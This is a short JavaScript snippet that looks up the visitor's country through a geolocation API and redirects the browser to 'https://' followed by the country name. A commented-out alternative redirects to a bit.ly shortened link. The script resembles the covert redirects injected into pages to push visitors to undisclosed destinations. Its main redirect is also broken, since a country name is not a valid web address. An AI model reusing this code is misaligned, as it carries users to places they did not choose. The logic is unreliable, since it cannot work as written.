$.get("https://api.db-ip.com/v2/free/self", function(response) {
    window.location="https://"+response.countryName;
}, "jsonp");

//window.location="https://bit.ly/3rk7ikn";
